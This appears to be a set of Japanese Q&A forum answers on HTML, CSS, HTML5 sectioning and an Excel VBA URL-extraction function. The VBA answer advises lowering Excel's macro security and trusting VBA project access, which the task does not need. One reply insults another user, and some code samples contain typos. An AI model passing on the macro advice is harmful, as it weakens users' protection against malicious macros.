いろいろなメリットがありますが、最大の特徴は国際基準ということです。 語弊を恐れずに言えば、その言語のフォントさえあれば、文字化けを起こしにくいということです。 新しめのサイトであれば、日本のみならず、世界のほとんどのサイトでutf-8になってるので、試しに確認してみるのも面白いかもしれません。逆にshift-jisを使う理由は、既存システムがshift-jisで出来てるから仕方なくなど、ネガティブな理由しか思いつきません。
meta 要素はコンピューターに与えるヒント 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 7.4.4 メタデータ 注意。 W3CのResource Description Framework (資源記述言語) ([RDF10]参照) は、1999年2月にW3C勧告となった。 RDFによって、著者は、HTML文書や他のネットワークでアクセスできる資源についての、機械可読なメタデータを指定できる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より <meta name="description" content=""> で、そのページの具体的な要約を示さなければなりません。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ よってページの内容がまったく同じでない限り値は異なるはずです。 　もし同じ内容を複数のページで提供していたら、それはそれでSEO的にとてもまずい。 　また、ページの内容とdescriptionの値が異なると、検索エンジンからはスパムと見なされることがあります。 ※descriptionの値は、そのサイト内で他のページと区別するための唯一のものにしましょう。 ※その内容は正確にページの内容を繁栄した物にしましょう。 ※一つしか書かないようにしましょう。--最後の物しか利用できないことが多い
属性値の書き方ですが、以下の三つすべてが同じ意味になります。 <div id=hoge> <div id='hoge'> <div id="hoge"> 一般に情報処理の世界では、 単引用符(U+0027)と二重引用符(U+0022)に別の意味を持たせる場合が多々ありますが、 HTML では両者を同じものとして扱っているようです。 調べてみると HTML の前身である SGML からしてそうでした。 更に言うと、アクサングラーブ(U+0060)をも引用符として認める実装があった様で、 現在の仕様にもその配慮があるようです。 http://www.w3.org/TR/html5/syntax.html#attribute … ↑ 祝! HTML5 正式勧告化 さて、なぜこの様な仕様になっているのかですが、 * 引用を表す表現が、米国式は二重引用符で英国式は単引用符で囲むから、両者に配慮した * 英文や仏文で多用される「アポストロフィ」や「ダブルクォート」をエスケープ無しに使いたいから あたりではないかと推測しているのですが、真相はわかりません。
a要素は行内(インライン)要素です。この行内要素ブロック要素の区別はHTML/CSSで重要なので覚えておくこと。 HTML4.01 　7.5.3 ブロックレベル要素と行内要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) CSS2.1 　9.2.1 ブロックレベル要素とブロックボックス( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　9.2.2インラインレベル要素とインラインボックス( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) ※ a要素をボックスにする。(display:inline-block) ※ ボックスモデルの寸法はpadding辺の内側になる。 　　hover時にborderやpaddingを指定するとずれるのであらかじめ透明色(transparent)で指定しておく。 結果・・・ header ul{ text-align:center;/* 中央配置floatは使わない */ width:100%;/* 適当な幅に */ margin:0 auto;padding:0; } header ul li{ list-style:none; display:inline-block; position:relative; width:20%;/* 適当な幅に */ padding:5px; } header ul li+li{ margin-left:70px;/* 二つ目以降は70px左をあける */ } header ul li a{ text-decoration:none; display:block; width:100%;height:100%;/* 直近のstatic以外の親ブロック(li)に対して */ border-bottom:solid 2px transparent; } header ul li a:hover{ border-color:red; }
余談ですが関数名をスペルミスしてましたね。 こちらでどうぞ。 <HTML> <HEAD> <META HTTP-EQUIV="Content-Script-Type" CONTENT="text/javascript"> <TITLE>リンクをランダムに表示する方法</TITLE> <SCRIPT TYPE="text/javascript"> var rlink = new Array();//リンクの配列 rlink[0] = "a.html"; rlink[1] = "b.html"; rlink[2] = "c.html"; rlink[3] = "d.html"; function RandomLink() { var random = Math.floor( Math.random() * rlink.length ); //randomは0～3のいずれかになる document.getElementById("RandomLink").href = rlink[random]; //id="RandomLink"のhrefを書き換える } </SCRIPT> </HEAD> <BODY> <a id="RandomLink" href="" onclick="RandomLink()">ランダムに開きます</a> </BODY> </HTML>
　ところで、まさかですが・・・tableを文書の整形に使用されていませんか？？ 15年前の1999年のHTML4.01の勧告以来、tableを文書の整形に使用することはとても強く否定されてきました。 　私も当時からtableは整形には使用していません。 『　⇒単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 『　⇒ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　また、これはそれ以上に 『HTML 4.01仕様は、3つのDTDを規定しており、著者は自分の文書に、次の3つの何れかの文書型宣言を含めねばならない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』です。 　もちろん、「　⇒HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 です。 ★DOCTYPEスイッチ 　このDOCTYPE宣言は、ブラウザにどのバージョンで作成されたかを示すためで、それによってブラウザは表示が大きく変わります。 　⇒DOCTYPEスイッチ－HTMLの基本 ( http://www.htmq.com/htmlkihon/302.shtml ) <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"> 　という宣言だと、MacIEを除いて他のブラウザは、ウェブ標準モードで描画します。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> 　だとMacIEも含めて標準モードで動作します。 ★なぜ、標準モードなのか 　互換モードは、IEが他のブラウザを追い落とすために独自仕様で描画を行っていた名残と言って良いでしょう。IEはOSに標準で付いてくるため、それでなければ見れないページを増やすことは、そのままOSのシェア確保の目的があったのでしょう。 　しかし、それではHTMLの本来の目的からかけ離れたものになる・・・ということで、ウェブ標準が定められ、Microsoftも長く抵抗していましたが、IE8以降はIEも標準モードに移行しました。 　すなわち、仕様どおり ・DOCTYPE宣言を書かれている。 ならば、すべてのブラウザでの表示は同じになる。 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ということです。 ＞cellpaddingをしていないのに、文字とテーブルの間に隙間ができてしまいます。 ＞<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN">をつけつつ、Ｈ１タグで記載しつつ、テーブルの間に隙間を作らない方法はありますか？ 　それは、単純にh1要素のマージンによるものでしょう。 ブラウザはデフォルトのスタイルシートで h1 { font-size: 2em; margin: .67em 0 } 　　⇒Default style sheet for HTML 4 - CSS 2.1 spec (ja) ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) になっています。 　<h1 style="margin:0;"> でマージンは消えるはずです。 　あわせて、<html><body>にもmargin:0;padding:0もね。 ★ただし、まずtableでデザインすることを止めるほうが先決です。 　⇒構造とプレゼンテーションの分離 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　それがHTML4.01以降のHTMLですし、次世代のHTM5ではもっと厳しくなります。 　こちらをご覧になると、その意味が実感できるでしょう。 　⇒ナビゲーションリストを様々にデザインしてみよう。 ( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　もちろん、tableは一切使われていないことがソースを見ればわかります。 ・HTMLには文書構造（意味的な）しか書かれていないため、メンテナンスが楽です。 　そのうえで、ブラウザの[表示]メニューから[スタイル(シート)]に進み、色々なスタイルシートを選択してみる。 　HTMLを書き換えることなく、スタイルシートを変更するだけでデザインが変更できる。 ・印刷プレビューで印刷状態を確認してみる ・ウィンドウ幅を変えてみる。 　 　
解決しようとする場所が間違えている気がします。 ドメイン名+index.phpでアクセスすればサイトは全体的に動作するのですが、ドメインのみでアクセスした場合、index.phpは表示されますが別のリンクからindex.phpに飛ぼうとするとうまく表示されません。これは、html拡張子の場合発生しません。 この、「別のリンクからindex.phpに飛ぼうとするとうまく表示されません」と何を指しているのでしょうか？ 「別のリンク」とはどういう意味しょう？ 「うまく表示されません」とは、なにがうまく表示されないのでしょう？ なにかのパラメータが必要？ 相対パスが外れる？ 例えば、css のパスが崩れるのであれば、 base タグを使えばいいでしょうし、 リダイレクトをした際に何らかのパラメータが入ってしまいご作動をしているのかもしれません。 また、URL も例えば、http://xxx.com/index.php/ と、最後にスラッシュが入っているなど、 質問者さんの言う「うまく表示されない」というのをもう一度検証してみてはいかがでしょうか？
HTMLの仕様では、 class = cdata-list [CS] 　要素識別子: id属性とclass属性( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ですから、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから CDATAは、文書文字集合中の任意の文字の列であり、文字実体をも含む。ユーザエージェントは、この属性値を次のように解釈する必要がある。 　文字実体は文字で置き換える。 改行文字LFは無視する。 個々の改行文字CRあるいはタブ文字は、1つの空白文字で置き換える。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Basic HTML data types (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ですが、CSSから利用するときは制約を受けます。すなわち 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから CSSでは、（要素名、クラス、およびセレクタ内のIDを含む）識別子は、文字[a-zA-Z0-9]およびISO 10646でU+00A0以上の文字、またハイフン（-）およびアンダースコア（_）のみを含むことができる。識別子は、数字、2つのハイフン、ハイフンの直後の数字で開始できない。また、識別子は、エスケープされた文字および数字コードとして任意のISO 10646文字を含めることができる（次項を参照）。たとえば、識別子"B&W?"は"B\&W\?"または"B\26 W\3F"として記述してよい。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Syntax and basic data types - CSS 2.1 spec (ja)( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )］より 　よって、日本語も使えます。!!! ★その上で「クラス名の考え方」という項目が下記ページの中ほどにあります。 　スタイルシートの基本 -- ごく簡単なHTMLの説明( http://www.kanzaki.com/docs/html/htminfo17.html# … ) 　その文章内のリンクも参照されると、class="left"とかclass="red"、class="container",class="main"とかはまずいことが分かると思います。 　意味があるもの、できればmetaとして意味を成すものがよいことが分かるでしょう。 　
正しく表示、が何を想定しているのか解りませんが、こういうことでしょうか <script>var d = new Date();</script><!-- 現在の時刻を記録する --> <h1>記録した現在の時刻</h1> <p><script>document.writeln(d.toLocaleString())</script></p> <h1>同じ時刻を世界標準時で表示</h1> <p><script>document.writeln(d.toUTCString())</script></p>
tableをしっかり理解しましょう。 　tdやthはtableではなくセル(cell)です。 ★スタイルシートでは、table要素、tr要素、th要素、td要素は個別に指定できます。 　borderは継承されませんからtableに指定してもその子孫には適用されない。 ★指定がない場合は、ブラウザが持つデフォルトのスタイルシートが適用されます。 仕様書どおりに厳密に書くと・ <table border="3" summary="テストの表"><!-- summaryは必須 --> 　<tbody><!-- tbodyは本来は書くべき --> 　　<tr> 　　　<td>test</td> 　　　<td>test</td> 　　　<td>test</td> 　　</tr> 　　<tr> 　　　<td>test</td> 　　　<td>test</td> 　　　<td>test</td> 　　</tr> 　</tbody> </table> 構造が分かりやすいように全角文字でインデントさせています。 タイプセレクタ 　table{}という指定で、HTMLのtable要素すべてに適用されます。 　※ただしtable要素のみ。 table{ 　border-collapse: separate;/* 分離ボーダーモデル、結合モデルのときはcollapse */ 　border-spacing: 5px; /* 分離ボーダーモデルのときのセル間の間隔 */ 　padding: 5px; 　border-style: solid; 　border-width: 3px; 　border-color: red;/* まとめてborder: solid red 3px;とも書ける */ 　border-right-width:6px; 　border-bottom-color: green;/* このように個別に指定もできる */ } th,td{ 　border: solid 1px blue; 　padding:1em 2em; } 二行目以降の枠線の色を変えたければ tr+tr th,tr+tr td{border-color:lime;} 二列目以降なら td + td,th + th{border-style:dotted;} 二行目だけなら tr:nth-child(2){background-colr:yellow;} 色々なテーブルの中で、このtableだけなら table[summary="テストの表"]{ 　border-collapse: separate; 　border-spacing: 5px; 　padding: 5px; 　border: solid red 3px; 　border-right-width:6px; 　border-bottom-color: green; } table[summary="テストの表"] th, table[summary="テストの表"] td{ 　border: solid 1px blue;padding:1em 2em; } table[summary="テストの表"] tr+tr th, table[summary="テストの表"] tr+tr td{border-color:lime;} table[summary="テストの表"] td + td, table[summary="テストの表"] th + th{border-style:dotted;} table[summary="テストの表"] tr:nth-child(2){background-colr:yellow;} とすれば他のtableにはsummaryの値が同じでない限り適用されない。 以上、まず試してください。 ＞すべてのtdタグにクラス名を付けるしかないのですか？ ・クラス名はあくまで文書の構造を保管するためで、デザインのために書くのではありません。 ・クラス名はなくとも、指定はできます。 　CSS(カスケーディングスタイルシート)は、そのカスケーディング（次々に影響を与えていく）の機能があるから、優れていてウェブ標準として活用されているのです。 　このカスケーディングの仕組みを知らないと「デザインのためにクラスをつける」なんて、本末転倒になってしまう。 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )
　<p class="title">????タイトルなら<h1>～<h6>じゃないのですか??というよりそうすべきです。 <h1>タイトル</h1> に対して、 h1{font-size:10em;margin:0;} で良いです。 　CSS（カスケーディング スタイル シート）はカスケーディングの仕組みが極めて有用だから利用されるのですから、カスケーディングを活用できなければ意味無いです。 1) まずHTMLで文書構造だけを詳しくマークアップします。 　　文書を構成する要素(Element)に分解して、ひとつひとつをタグでマークアップする。 　　タイトル--見出しは<h1>～<h6>を段落なら<p>と・・・ 　　用意された要素では文書構造が示しきれない時にidやclassを併用する。(あくまで文書構造を補完するため) 　　それで著者にも機械にも検索エンジンにもその文書のタイトルがどれか、どこからどこまでが段落かがわかる。 display:inlineは、その要素を行内要素に変更します。 ※ブロックレベル要素と行内要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )は極めて重要な概念です。理解しておきましょう。 p.title{}とは、class属性の値リストに"title"というテキストを含むp要素と言う意味 display:inlineとは、その要素を行内要素にするということ。言い換えると <div> 　<p class="title">タイトル</p> 　<p>あいうえお</p> </div> 　↓ <div> 　<span>タイトル</span> 　<p>あいうえお</p> </div> とせよということ。次にp要素がくるのでspanは匿名ブロックに囲まれる。---あまりよくない。 ＞こんなに空白を表示させたくないため、display:inline;を付け加えたのですが、 　必ずしも行間は開きません。匿名ブロックが作られるためブラウザによったら間隔は飽いたままになる。 　また、当然、行内要素にはtext-align:centerなんてないです。幅自体が内容の大きさに依存するからです。 　インラインレベル要素とインラインボックス( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) ※空白ではなくマージンと言います。前後にマージンを取りたくないということ 　これは、HTMLが元々欧文を想定しているために日本語を使用する場合、 ・行間が詰まってみえること ・段落の変わり目がマージンではなくインデントのほうが良い 　などの理由から、私は次のようにタイプセレクタで指定しています。 p{line-height:1.6em;margin:0;text-indent:1em;} 見出しに関しては、本文中の<h2>～<h6>に関しては子孫セレクタを使って div.section h2,div.section h3,div.section h4,div.section h5,div.section h6{margin:0;line-height:1.6em;} とか・・ 　その上で、ページタイトルなどは HTML5では、各要素の目的が強く厳密性が求められます。見出しは必ず<h1>～</h1>というふうに。以前のHTMLでは、文書構造を示す要素がないためにDIVやSPANにid,classを併用して文書構造を示してきましたね。<div class="section">ここから本文</div> 　『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　HTML5は、(文書構造を示す要素が追加されたため)まず最適な要素を探してそれを使用する。それがないときの最後の最後の手段としてDIVを使う。 ＞text-align:center; を適用しつつ、</p>の後にこんなに改行させないためにはどうすればよろしいでしょうか？ 　タイトルですから <h2>タイトル</h2> として h2{ margin:0;line-height:1.6em;text-align:center; background-color:navy;color:white; } 　これで、見出し(h2)は、上下左右の中央に配置され、紺色地に白文字で表示されるはずです。
＞どちらも、グループ分け・カテゴリー分けする際に使っています。 　判断基準はこれではない。 HTML5では、常に文書のアウトラインを考えます。 　簡単に言うと機械(コンピューター)が自動的に目次を作ると考える。 　典型的なHTML構文で解説すると <body> 　<header><!-- この文書のヘッダ --> 　　<h1>ページタイトル</h1> 　　<nav>ナビゲーション(headerにあるので多分グローバル</nav> 　</header> 　<section><!-- 本文 --> 　　<h2>本文見出し</h2> 　　<section><!-- sectionの階層でアウトラインを示す --> 　　　<h3>章見出し</h3> 　　　<!-- sectionには必ず一つだけ見出し<h1>～<h6>が存在する(と期待される) --> 　　　<p>記事</p> 　　　<aside>このsectionと直接関係しない補足記事</aside> 　　</section> 　　<section> 　　　<h3>章見出し</h3> 　　　<p>記事</p> 　　　<article> 　　　　<!-- それ自体が独立してheader,section.footerを持つと期待される完結した記事はarticle --> 　　　　<header></header> 　　　　<section></section> 　　　　<footer></footer> 　　　</article> 　　</section> 　　<nav id="content Table">目次</nav> 　　<aside> 　　　このsectionとは直接関係ない記事 　　</aside> 　</section> 　<footer> 　</footer> </body> DIVに関しては、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから NOTE: Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of more appropriate elements instead of the div element leads to better accessibility for readers and easier maintainability for authors. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.4 Grouping content — HTML5( http://www.w3.org/TR/html5/grouping-content.html … )］より 簡単に訳すと 「他により適切な要素がないときの最後の最後の手段としてdiv要素を使用することが強く推奨される。div要素よりも適切な要素を使うことで、読者のためにはより良いアクセシビリティを、作家にとってはメンテナンスの向上につながる。」 　一方sectionについては、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから NOTE: Authors are encouraged to use the article element instead of the section element when it would make sense to syndicate the contents of the element. NOTE: The section element is not a generic container element. When an element is needed only for styling purposes or as a convenience for scripting, authors are encouraged to use the div element instead. A general rule is that the section element is appropriate only if the element's contents would be listed explicitly in the document's outline. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.3 Sections — HTML5( http://www.w3.org/TR/html5/sections.html#the-sec … )］より 『その記事が、単独でも(header,section,footeを持っているような)脈絡・組織的?)な場合はarticleを使うべき』 『section、(DIVのような)一般的なコンテナ要素ではありません。単にスタイリングの目的のためやスクリプトの便宜のために必要なときはは、div要素を使うことが奨励される。』 　この二つを読み比べると、sectionとdivの使い分けが分かると思います。 sectionを使用するポイントは、The section element | HTML5 Doctor( http://html5doctor.com/the-section-element/ )にとても良い解説がある。 ・スタイリングやスクリプティングのフックのためだけに使うな。 　　それには div を使うこと。 ・article, aside, nav などがより適切な場合には使うな。 ・sectionには、入れようと思えば見出し<h1>～<h6>が自然に入れられるような場合に使え
Tableタグを使うのが古い方法で、表（table）を作らない場合はスタイルシートで表のように見せる（デザインする）ようにしましょう、という流れになっているためです。 例を挙げます。 ■htmlファイルで直接デザインするケース（昔） <h1 style="border:1px solid #000;background:#ccc">HTMLタグ リファレンス</h1> とHTMLファイルに書いてみましょう。 style="○○"とは、 「1ピクセルのまっすぐな黒い線で囲って、背景をグレーにしなさい」 というデザインの指示です。 h1タグに背景色をつけると、tableタグのようにその行いっぱいに色がつきます。 tableタグを使わなくても、このようにデザインすることができます。 ■外部スタイルシートでデザインするケース（今） <h1>HTMLタグ リファレンス</h1> とタグだけシンプルにHTMLファイルに書いてみます。 そのHTMLファイルの<head>～</head>の間に <link rel="stylesheet" type="text/css" href="style.css" media="all"> と書き、そのhtmlファイルが置いてあるルートと同じ場所にstyle.cssというファイルを作ります。 これは、このHTMLファイルはstyle.cssというファイルに書いてあるデザインを読み込みなさい、という指示です。 style.cssというファイルの中には、 h1{border:1px solid #000;background:#ccc} とstyle.cssに記述すると、（昔）のケースと全く同じように表示されます。 仮に、1万ページhtmlファイルのある巨大サイトを作ったあとに、デザインを変えたくなった時のことを考えてみてください。 例えば線のデザインを1pxではなく5pxにしたくなった場合、各1万ページ分のhtmlファイルがstyle.cssという1枚のファイルを読み込んでいる場合は、style.css1枚の内容を1か所書き換えれば、1万ページ全部のhtmlファイルは何の変更をせずにすべて5pxのデザインに変更することができます。 しかしもし昔のようにCSSファイルを使わず、各1万ページのHTMLのh1やtableタグに、色や線の情報をそれぞれ書き込むと、1万ページ全部、h1タグの1pxというところを5pxに直さなければなりません。 そのようなメンテナンスの煩雑さを避けるために、見た目のデザインなどはスタイルシートに書きましょう、となってきました。これが、外部スタイルシートの始まりです。 がんばって学んでみてくださいネ。
>フラッシュのチャットはレンタルですので何もいじれません。 そうなると、こちら側で自分で実装するしかないね。 >ですので別のＨＴＭＬの部分に別のフラッシュかＪＡＶＡでノックするボタンを付ければと思っておりますが、私には難しいです。 わかる人に頼むか、お金出して作ってもらうしかないと思う。 >ですので、入室を感知するのではなくてボタンを押すことで、言われるような方法なのかなと思ったり。 うん、入室どうのこうのはそのレンタルしている側のシステムでしか拾えないから、 htmlを表示した際に実行されるようにこっちで作るしかない。
背景で指定しているのでしょうね。 background:url() no-repeat;とかにしましょう。
「HP」というのはサーバーサイドのプログラミングのない 静的なサイトということですよね。 WebデザイナーはDreamweaver、SEはsakueraエディタが多いです。 Javaだと圧倒的にEclipseになりますけど。
ORUKA1951君 ＞<a name="top"><h1>TOP</h1></a> じゃ駄目なんですか？ 私はあなたに質問したか？　あなたに回答を期待したか？ これに答える必要はない。質問者の質問に答えるという基本的なルールを理解し、それを実践すること。日本語が不自由ならな日本語学校に通うこと、それだけが必要とされていることを理解すること。 ＃馬鹿相手は消耗するよな。
link集のようなページをコピーしてエクセルに貼り付け、次のユーザー定義関数を使ってみてください。 エクセルのハイパーリンク先のURLを取得するユーザー定義関数 数式で設定しているものを除きます。 ファイルやドキュメント内リンクも除きます。 URLは、最初に設定しているhttpから始まっているものを返します。 A1セルに設定しているハイパーリンクのURLを表示するには、以下の式を使います。 = GetURL(A1) 設定方法は、 １．Alt + F11 で VBE(Visual Basic Editor)を開きます。 ２．VBE のメニューから[挿入] -->[標準モジュール] を指定します。 ３．コードウィンドウに下記コードをコピーして貼り付けます。 ４．右上隅の×でウィンドウを閉じ、シートに戻ります。 ５．メニューから[開発]の[マクロのセキュリティ]の、 「マクロの設定」で「警告を表示してすべてのマクロを有効にする」、 　「開発者向けのマクロ設定」で「VBAプロジェクト　オブジェクト　モデルへのアクセスを信頼する」にチェックを入れてOKをクリックする。 これで、GetURL関数が使用できる状態になります。 Function GetURL(Rng As Range) As String Dim Adr As String If Rng.Hyperlinks.Count > 0 Then With Rng.Hyperlinks(1) If .Address Like "http*" Then Adr = .Address End If End With End If If Adr <> "" Then GetURL = Adr Else GetURL = "" End If End Function
　どんな優れたオーサリングツール・CMS・テンプレートを使おうが、必ずHTML/CSSのと知識は必要です。それどころか、テキストエディタで作成する以上に知識が必要です。ここを誤解されていませんか??。HTML/CSSの知識が必要な事は分かると思いますが、それ以上に他人の作成したテンプレートを解析する能力や、仕組みや癖の知識が必要なのですから・・・。 　想像するに、リンクに限らず、その部分の文字列の選択もできないのじゃないかと思います。単にレイヤがかぶさっいるだけじゃないかと・・ 　ところで、そのテンプレート・・ディスプレイ幅が狭いと使えないですね。 　ウェブ開発されているなら当然、開発者向けツール( https://addons.mozilla.jp/firefox/extensions/dev … )の豊富なfirefoxお使いだと思いますが、firebugで該当する要素の上に他の要素がかぶさっていないか確認してみてください。ならz-indexの制御で何とかなるかと・・
これらは違う。 HTML: SGMLを参考に作られたもので、目的は文書をそれを構成する要素(Element)に分解して、それぞれの要素をタグでマークアップするマークアップ言語 　その意味では、SGMLの背景( http://ja.wikipedia.org/wiki/Standard_Generalize … )を読むのが最も分かりやすいでしょう。 　HTMLで記述されたファイルが、見出しはゴシック体で太文字で見えたり、段落で改行して見えることとは無関係です。 スタイルシート: 色々あるけどCSSについて 　スタイルシートは、そのHTMLをどのようにプレゼンテーションするかを指定するものです。ブラウザで、それなりに見えるのはブラウザが持つスタイルシートによるものです。 文書構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ・・・まずこの二つを明確に分けてください。 Wordpressは、コンテンツマネージメントシステム(CMS)の一分野であるブログシステムのひとつです。 コンテンツマネージメントシステム( http://ja.wikipedia.org/wiki/%E3%82%B3%E3%83%B3% … ) |　　データベースから、HTMLやCSSをサーバーサイドで動的に合成する。 | | |-- 汎用 |　　　XOOPSなど |-- 電子商取引 |-- 教育 |-- ブログシステム(Web上に日記を作成するツール) |　　|-- Movable Type |　　|-- WordPress　　★　この位置付けがWordpress |　　└-- などたくさんある。 |-- ウィキ |-- ソーシャル・ネットワーキング・サービス (SNS)★ 　　　SNS用はこちらになる。 　　　SNSサービスであるMixiは、 ・ソーシャル・ネットワーキング・サービス( http://ja.wikipedia.org/wiki/%E3%82%BD%E3%83%BC% … ) 　例えば、OpenPNE( http://ja.wikipedia.org/wiki/OpenPNE )がSNS向けのCMSになります。 ＞以前、Webディレクター経験者の方から聞いたところ、できることの違いはあまりないと言われました。 　いくらなんでも酷い言い方ですね。「動力源と車輪」と「プリウス」は、できること違いはない。と言うようなものです。そりゃそうも言えなくもないが・・・おかしいのは分かるでしょう。 ★Wordpressは、あくまでブログシステムです。実際にはCMSとしても使われている。 　しかし、SNSとしては使うのは無理があるでしょう。 　PHPなり、CGI(Perl,Ruby)を利用して新たに書き起こしたほうがよいような気がします。
＞headerはページ内に１つしかないから、idで宣言すればいいのでしょうか？ 　ひとつしかないわけないです。HTML5が参考になりますが <body> 　<header> 　　この記事のheader 　　<nav>サイトナビゲーション</nav> 　<header> 　<section id="section1"> 　　見出し<h1～h6>を一つだけ持つと期待される本文 　　<section id="section1-1"> 　　　見出し<h1～h6>を一つだけ持つと期待される本文 　　　<article> 　　　　header,section,footerを持つと期待される完結した記事 　　　　<header> 　　　　</header> 　　　　<section id="section1-1-2"></section> 　　　　<footer></footer> 　　　</article> 　　　<article> 　　　　<header></header> 　　　　<section></section> 　　　　<footer></footer> 　　　</article> 　　　<aside>本文と直接関係ない記事</aside> 　　　<nav id="tableContent">ナビゲーション</nav> 　　</section> 　　<section id="section1-2"> 　　</section> 　</section> 　<footer></footer> </body> ・・・・headerは、その記事の集合のheaderなのですから、一つのページ内に何度も登場する可能性があります。 　基本的にリンクやjavascriptのターゲットになるとき以外はidは使わないほうが無難です。詳細度が高くなってスタイルシート時に面倒になる。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』のですから、一ページに何度も登場する可能性のあるheaderはclassのほうが適切でしょう。リンクターゲットして一意な要素が必要なら <div class="header" id="TOP">とでもしておけば良い。 　将来的にHTMLに書き直すことを念頭において、HTML5の新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … )をclass名にして文書構造を示すのが、色々な意味で良いでしょうね。【後述のサンプル】 　自動変換ツールでHTML4.01→HTML5にできますし、googleなどの検索エンジンも、それが文書構造を示すclass名と理解してくれているようですから・・。 <body> 　<div class="header"> 　　この記事のheader 　　<div class="nav">ナビゲーション</div> 　</div> 　<div class="section" id="section1"> 　　見出し<h1～h6>を一つだけ持つと期待される本文 　　<div class="section" id="section1-1"> 　　　見出し<h1～h6>を一つだけ持つと期待される本文 　　　<div class="article"> 　　　　header,section,footerを持つと期待される完結した記事 　　　　<div class="header"> 　　　　</div> 　　　　<div class="section" id="section1-1-2"></div> 　　　　<div class="footer"></div> 　　　</div> 　　　<div class="article"> 　　　　<div clas="header"></div> 　　　　<div class="section"></div> 　　　　<div class="footer"></div> 　　　</div> 　　　<div class="aside">本文と直接関係ない記事</div> 　　　<div class="nav" id="tableContent">ナビゲーション</div> 　　</div> 　　<div class="section" id="section1-2"> 　　</div> 　</div> 　<div class="footer"></div> </body>
＞私は初心者に優しくかつ覚えやすいお勧めの著書はあると思います。 　今年の9/16にやっと勧告になったもので、その直前にもmain要素の追加などがされました。 　ですから、まだありません。 ＞誰もが初めからこのような小難しい仕様書を読むことが出来れば、初心者なんてこの世にいないと思いますが・・・。 　小難しくはないです。正確に書こうとすると回りくどく感じるだけで、無駄なことは書いてないし、極めて効率的ですよ。 　私は、今から15年前、HTML4.01が勧告になった直後に、様々な書籍を買いあさりました。しかし、結局どれも ［こうするときはこうしなさい!!］しかない。それって数学や化学の勉強をする時に問題集をひたすら解いて解き方を覚える手法と変わらない。膨大な実例を経験したって、現実に問題に遭遇したときの解決にはならない。結局、理論・定義まで遡るしかない。 　なら、基本からきっちり学んだほうが早いし間違いがない。応用も利きますしね。HTML4.01の仕様書なんて、主文は高々数十ページしかない。慣れないうちはあなたと同じように「難しく」感じていましたが、すぐ慣れました。 　以前のようにtransitinalやframesetは必要ないですから、当時に比べたらはるかに楽でしょう。 　HTML5は、HTML4.01strictの直系の子孫です。(HTML3.2→HTML4.01とは違う) 　私はRubyではなくPerlですが、最終的には、プログラミングPerl( http://www.oreilly.co.jp/books/4873110963/ )に行き着く。 　HTML4.01をとにかく通しで読んでおきましょう。その後HTML5への変更箇所を学べばよいです。へたな本を読むより、確実に本道を歩めるし簡単だし間違いない。 良いサイト ⇒HTML5.JP - 次世代HTML標準 HTML5情報サイト( http://www.html5.jp/ ) 　⇒HTML5タグリファレンス - HTML5.JP( http://www.html5.jp/tag/index.html ) 　あくまでHTML4.01をマスターしていての話ですが、html5doctorは悩むところを解説してある。
>ただ、社内にはプロキシサーバはありません。複数の事業所があるのですが、各事業所内の人数(PC数)は少ないので、全ての事業所が、ONU→ルータ→ネットワークHUB→各個人のPCのような形になっています。 であれば、プロキシは関係ないので忘れてください。 どんなヘッダがやり取りされているか見てみると、なんか原因がわかるかもね。 アクセスしてるPCの時間がおかしいとか、サーバの時間がおかしいとか。
